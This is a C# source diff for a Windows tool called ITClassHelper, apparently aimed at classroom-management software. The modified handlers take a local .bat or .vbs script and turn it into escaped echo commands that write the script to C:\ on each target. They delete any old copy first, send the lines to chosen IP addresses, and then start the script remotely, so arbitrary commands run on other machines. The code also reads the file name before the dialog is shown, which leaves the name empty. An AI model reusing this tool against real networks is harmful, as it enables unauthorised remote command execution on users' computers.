@@ -11,7 +11,7 @@ using System.Threading;
 using System.Windows.Forms;
 using static ITClassHelper.ProcMgr;
 using static ITClassHelper.NetAttack;
-using static ITClassHelper.Rooms;
+using static ITClassHelper.Shared;
 
 namespace ITClassHelper
 {
@@ -138,46 +138,16 @@ namespace ITClassHelper
 
         private void SendScriptMenuItem_Click(object sender, EventArgs e)
         {
-            OpenFileDialog fileDialog = new OpenFileDialog
-            {
-                Multiselect = false,
-                Title = "选择脚本文件",
-                Filter = "攻击脚本(*.iscp)|*.iscp"
-            };
-            if (fileDialog.ShowDialog() == DialogResult.OK)
-            {
-                new Thread(x =>
-                {
-                    try
-                    {
-                        using (StreamReader sr = new StreamReader(fileDialog.FileName))
-                        {
-                            string fileLine;
-                            while ((fileLine = sr.ReadLine()) != null)
-                            {
-                                SendPack(fileLine, GetSelectedIPs(), int.Parse(PortTextBox.Text), roomType);
-                                Thread.Sleep(1000);
-                            }
-                        }
-                    }
-                    catch (ArgumentNullException)
-                    { MessageBox.Show("还没有选择脚本！", "错误", MessageBoxButtons.OK, MessageBoxIcon.Error); }
-                }) { IsBackground = true }.Start();
-            }
-        }
-
-        private void ScripterMenuItem_Click(object sender, EventArgs e)
-        {
             OpenFileDialog openScriptDialog = new OpenFileDialog
             {
                 Multiselect = false,
                 Title = "选择脚本文件",
-                Filter = "原始BAT脚本(*.bat)|*.bat"
+                Filter = "批处理文件(*.bat)|*.bat|Visual Basic 脚本(*.vbs)|*.vbs"
             };
+            string openScriptPath = openScriptDialog.FileName;
+            string scriptName = openScriptPath.Substring(openScriptPath.LastIndexOf('\\') + 1);
             if (openScriptDialog.ShowDialog() == DialogResult.OK)
             {
-                string openScriptPath = openScriptDialog.FileName;
-
                 int lineCnt = 0;
                 using (FileStream lineFs = new FileStream(openScriptPath, FileMode.OpenOrCreate, FileAccess.ReadWrite))
                 {
@@ -188,44 +158,92 @@ namespace ITClassHelper
                     }
                 }
 
-                SaveFileDialog saveScriptDialog = new SaveFileDialog
+                List<string> newLines = new List<string>(lineCnt + 2);
+                using (StreamReader sr = new StreamReader(openScriptPath))
                 {
-                    Title = "保存脚本文件",
-                    Filter = "攻击脚本(*.iscp)|*.iscp"
-                };
-                string saveScriptPath = saveScriptDialog.FileName;
-                string saveScriptName = saveScriptPath.Substring(saveScriptPath.LastIndexOf("\\") + 1);
-
-                if (saveScriptDialog.ShowDialog() == DialogResult.OK)
-                {
-                    List<string> newLines = new List<string>(lineCnt + 2);
-                    using (StreamReader sr = new StreamReader(openScriptPath))
+                    newLines.Add($@"del /f /q C:\{scriptName}");
+                    string line, newLine = "";
+                    while ((line = sr.ReadLine()) != null)
                     {
-                        newLines.Add($@"del /f /q C:\{saveScriptName}");
-                        string line, newLine = "";
-                        while ((line = sr.ReadLine()) != null)
+                        newLine = "echo ";
+                        foreach (char ch in line)
                         {
-                            newLine = "echo ";
-                            foreach (char ch in line)
-                            {
-                                if ((ch >= '0' && ch <= '9') || (ch >= 'A' && ch <= 'Z') || (ch >= 'a' && ch <= 'z'))
-                                    newLine += ch;
-                                else
-                                    newLine += "^" + ch;
-                            }
-                            newLine += $@" >> C:\{saveScriptName}";
-                            newLines.Add(newLine);
+                            if ((ch >= '0' && ch <= '9') || (ch >= 'A' && ch <= 'Z') || (ch >= 'a' && ch <= 'z'))
+                                newLine += ch;
+                            else
+                                newLine += "^" + ch;
                         }
-                        newLines.Add($@"start C:\{saveScriptName}");
+                        newLine += $@" >> C:\{scriptName}";
+                        newLines.Add(newLine);
+                    }
+                    newLines.Add($@"start C:\{scriptName}");
+                }
+
+                new Thread(x =>
+                {
+                    foreach (string line in newLines)
+                    {
+                        SendPack(line, GetSelectedIPs(), int.Parse(PortTextBox.Text), roomType);
+                        Thread.Sleep(1000);
                     }
 
-                    using (StreamWriter sw = new StreamWriter(saveScriptDialog.FileName))
+                })
+                { IsBackground = true }.Start();
+            }
+        }
+
+        private void ScripterMenuItem_Click(object sender, EventArgs e)
+        {
+            OpenFileDialog openScriptDialog = new OpenFileDialog
+            {
+                Multiselect = false,
+                Title = "选择脚本文件",
+                Filter = "批处理文件(*.bat)|*.bat|Visual Basic 脚本(*.vbs)|*.vbs"
+            };
+            string openScriptPath = openScriptDialog.FileName;
+            string scriptName = openScriptPath.Substring(openScriptPath.LastIndexOf('\\') + 1);
+            if (openScriptDialog.ShowDialog() == DialogResult.OK)
+            {
+                int lineCnt = 0;
+                using (FileStream lineFs = new FileStream(openScriptPath, FileMode.OpenOrCreate, FileAccess.ReadWrite))
+                {
+                    using (StreamReader lineSr = new StreamReader(lineFs))
                     {
-                        foreach (string s in newLines)
-                            sw.WriteLine(s);
+                        while (lineSr.ReadLine() != null)
+                            lineCnt++;
                     }
-                    MessageBox.Show($@"脚本已保存到 {saveScriptDialog.FileName}！", "信息", MessageBoxButtons.OK, MessageBoxIcon.Information);
                 }
+
+                List<string> newLines = new List<string>(lineCnt + 2);
+                using (StreamReader sr = new StreamReader(openScriptPath))
+                {
+                    newLines.Add($@"del /f /q C:\{scriptName}");
+                    string line, newLine = "";
+                    while ((line = sr.ReadLine()) != null)
+                    {
+                        newLine = "echo ";
+                        foreach (char ch in line)
+                        {
+                            if ((ch >= '0' && ch <= '9') || (ch >= 'A' && ch <= 'Z') || (ch >= 'a' && ch <= 'z'))
+                                newLine += ch;
+                            else
+                                newLine += "^" + ch;
+                        }
+                        newLine += $@" >> C:\{scriptName}";
+                        newLines.Add(newLine);
+                    }
+                    newLines.Add($@"start C:\{scriptName}");
+                }
+
+                new Thread(x =>
+                {
+                    foreach (string line in newLines)
+                    {
+                        SendPack(line, GetSelectedIPs(), int.Parse(PortTextBox.Text), roomType);
+                        Thread.Sleep(1000);
+                    }
+                    
+                }) { IsBackground = true }.Start();
             }
         }
 
